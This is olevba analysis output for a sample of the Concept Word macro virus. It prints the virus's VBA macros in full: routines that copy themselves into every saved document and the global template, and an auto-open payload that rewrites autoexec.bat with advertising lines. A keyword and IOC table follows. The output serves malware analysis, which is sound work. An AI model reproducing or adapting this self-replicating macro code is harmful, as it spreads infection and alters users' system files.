olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Concept-24590d67c9751e9e16d2577f697f698738bacea2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Concept-24590d67c9751e9e16d2577f697f698738bacea2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Concept-24590d67c9751e9e16d2577f697f698738bacea2 - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim sMe$
Dim sTMacro$

    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
    On Error GoTo -1: On Error GoTo Abort
    WordBasic.CurValues.FileSaveAs dlg
    WordBasic.Dialog.FileSaveAs dlg
    If dlg.Format = 0 Then dlg.Format = 1
    sMe$ = WordBasic.[FileName$]()
    sTMacro$ = sMe$ + ":Autoopen"
    WordBasic.MacroCopy "Global:AO", sTMacro$
    sTMacro$ = sMe$ + ":AO"
    WordBasic.MacroCopy "Global:AO", sTMacro$
    sTMacro$ = sMe$ + ":FSA"
    WordBasic.MacroCopy "Global:FSA", sTMacro$
    sTMacro$ = sMe$ + ":ActualVirus"
    WordBasic.MacroCopy "Global:ActualVirus", sTMacro$
    WordBasic.FileSaveAs dlg
    GoTo Done

Abort:
    If Err.Number <> 102 Then
        WordBasic.FileSaveAs dlg
    End If

Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FSA.bas 
in file: Virus.MSWord.Concept-24590d67c9751e9e16d2577f697f698738bacea2 - OLE stream: 'Macros/VBA/FSA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim sMe$
Dim sTMacro$

    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
    On Error GoTo -1: On Error GoTo Abort
    WordBasic.CurValues.FileSaveAs dlg
    WordBasic.Dialog.FileSaveAs dlg
    If dlg.Format = 0 Then dlg.Format = 1
    sMe$ = WordBasic.[FileName$]()
    sTMacro$ = sMe$ + ":Autoopen"
    WordBasic.MacroCopy "Global:AO", sTMacro$
    sTMacro$ = sMe$ + ":AO"
    WordBasic.MacroCopy "Global:AO", sTMacro$
    sTMacro$ = sMe$ + ":FSA"
    WordBasic.MacroCopy "Global:FSA", sTMacro$
    sTMacro$ = sMe$ + ":ActualVirus"
    WordBasic.MacroCopy "Global:ActualVirus", sTMacro$
    WordBasic.FileSaveAs dlg
    GoTo Done

Abort:
    If Err.Number <> 102 Then
        WordBasic.FileSaveAs dlg
    End If

Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AO.bas 
in file: Virus.MSWord.Concept-24590d67c9751e9e16d2577f697f698738bacea2 - OLE stream: 'Macros/VBA/AO'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim GetPB$
Dim XMacroCount
Dim n
Dim XFileSaveAs
Dim XFileName$
Dim XMacro$
Dim line_of_text$
    
    On Error Resume Next

    GetPB$ = WordBasic.[GetPrivateProfileString$]("ffnetapi.novaxserverlist", _
    "server", "C:\windows\firefox.ini")
    
        If GetPB$ = "pbn1" Then
            GoTo Abort
            End If
    
    XMacroCount = WordBasic.CountMacros(0, 0)

    For n = 1 To XMacroCount
        If WordBasic.[MacroName$](n, 0, 0) = "FileSaveAs" Then
        XFileSaveAs = -1
        End If
    Next n

    If Not XFileSaveAs Then
        XFileName$ = WordBasic.[FileName$]()
        XMacro$ = XFileName$ + ":FSA"
        WordBasic.MacroCopy XMacro$, "Global:FileSaveAs"
        XMacro$ = XFileName$ + ":FSA"
        WordBasic.MacroCopy XMacro$, "Global:FSA"
        XMacro$ = XFileName$ + ":AO"
        WordBasic.MacroCopy XMacro$, "Global:AO"
        End If

        Open "c:\autoexec.bat" For Input As 1
        Open "c:\ac.bat" For Output As 2

        While Not EOF(1)
        Input #1, line_of_text$
        Print #2, line_of_text$
        Wend

Print #2, "ECHO Ring/Fax Nick at Affordable Computers on 01778 341299"
Print #2, "ECHO 386's from £150, 486's from £250, Pentium's from £450"
Print #2, "ECHO Multimedia upgrades from £85. Open 24hrs!!. Lifetime"
Print #2, "ECHO support and helpful after-sales service"

        Close 1
        Close 2

        WordBasic.Kill "c:\autoexec.bat"
        WordBasic.Rename "c:\ac.bat", "c:\autoexec.bat"

Abort:

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Autoopen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |ac.bat              |Executable file name                         |
+----------+--------------------+---------------------------------------------+

